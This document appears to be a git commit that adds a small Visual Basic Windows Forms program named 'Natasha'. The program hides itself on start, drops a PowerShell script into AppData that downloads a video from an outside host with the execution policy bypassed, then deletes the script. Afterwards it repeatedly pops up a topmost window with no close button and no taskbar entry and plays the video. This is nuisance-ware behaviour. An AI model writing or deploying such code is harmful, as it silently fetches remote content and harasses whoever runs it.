c7e847b706cf9ce0dff32923a534c99f1d601c8a
Noxyntious <noxy@noxyntious.xyz>
2023-07-18 17:25:01 +0200

    visual studio git integration work challenge, instant fail

---
+++ WindowsApp1/Form1.Designer.vb
@@ -0,0 +1,71 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.player = New AxWMPLib.AxWindowsMediaPlayer()
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
+        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
+        CType(Me.player, System.ComponentModel.ISupportInitialize).BeginInit()
+        Me.SuspendLayout()
+        '
+        'player
+        '
+        Me.player.Enabled = True
+        Me.player.Location = New System.Drawing.Point(-44, -5)
+        Me.player.Name = "player"
+        Me.player.OcxState = CType(resources.GetObject("player.OcxState"), System.Windows.Forms.AxHost.State)
+        Me.player.Size = New System.Drawing.Size(385, 593)
+        Me.player.TabIndex = 0
+        '
+        'Timer1
+        '
+        '
+        'Timer2
+        '
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(296, 523)
+        Me.Controls.Add(Me.player)
+        Me.Cursor = System.Windows.Forms.Cursors.No
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
+        Me.MaximizeBox = False
+        Me.MinimizeBox = False
+        Me.Name = "Form1"
+        Me.ShowInTaskbar = False
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "Natasha"
+        Me.TopMost = True
+        CType(Me.player, System.ComponentModel.ISupportInitialize).EndInit()
+        Me.ResumeLayout(False)
+
+    End Sub
+
+    Friend WithEvents player As AxWMPLib.AxWindowsMediaPlayer
+    Friend WithEvents Timer1 As Timer
+    Friend WithEvents Timer2 As Timer
+End Class
---
+++ WindowsApp1/Form1.vb
@@ -0,0 +1,67 @@
+﻿Imports AxWMPLib
+Imports WMPLib
+Imports System.Timers
+Imports System.Net
+
+Public Class Form1
+    Private Const CP_NOCLOSE_BUTTON As Integer = &H200
+    Protected Overloads Overrides ReadOnly Property CreateParams() As CreateParams
+        Get
+            Dim myCp As CreateParams = MyBase.CreateParams
+            myCp.ClassStyle = myCp.ClassStyle Or CP_NOCLOSE_BUTTON
+            Return myCp
+        End Get
+    End Property
+    Private Sub AxWindowsMediaPlayer1_Enter(sender As Object, e As EventArgs) Handles player.Enter
+
+    End Sub
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Me.Hide()
+        If System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\interval.txt") Then
+
+        Else
+            Dim intervalFile As System.IO.StreamWriter
+            intervalFile = My.Computer.FileSystem.OpenTextFileWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\interval.txt", True)
+            intervalFile.Write("300000")
+            intervalFile.Close()
+        End If
+        Dim fileReader As String
+        fileReader = My.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\interval.txt")
+        Timer1.Interval = 7200
+        If System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\natasha.wmv") Then
+
+        Else
+            Dim file As System.IO.StreamWriter
+            file = My.Computer.FileSystem.OpenTextFileWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\dl.ps1", True)
+            file.Write("Invoke-WebRequest -Uri ""http://noxyntious.xyz/natasha.wmv"" -OutFile ""$env:APPDATA\natasha.wmv""")
+            file.Close()
+            Dim psi As New ProcessStartInfo("powershell.exe", "-noprofile -ExecutionPolicy Bypass -file " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\dl.ps1")
+            Dim p As New Process
+            p.StartInfo = psi
+            p.Start()
+            p.WaitForExit()
+            My.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\dl.ps1")
+        End If
+        Threading.Thread.Sleep(10000)
+        Timer1.Start()
+        player.URL = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\natasha.wmv"
+        player.Ctlcontrols.play()
+        Timer2.Interval = Convert.ToInt32(fileReader)
+
+    End Sub
+
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        Timer1.Stop()
+        Timer2.Start()
+        Me.Hide()
+    End Sub
+
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+        Me.Show()
+        Timer2.Stop()
+        Timer1.Start()
+        player.URL = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\natasha.wmv"
+        player.Ctlcontrols.play()
+    End Sub
+End Class
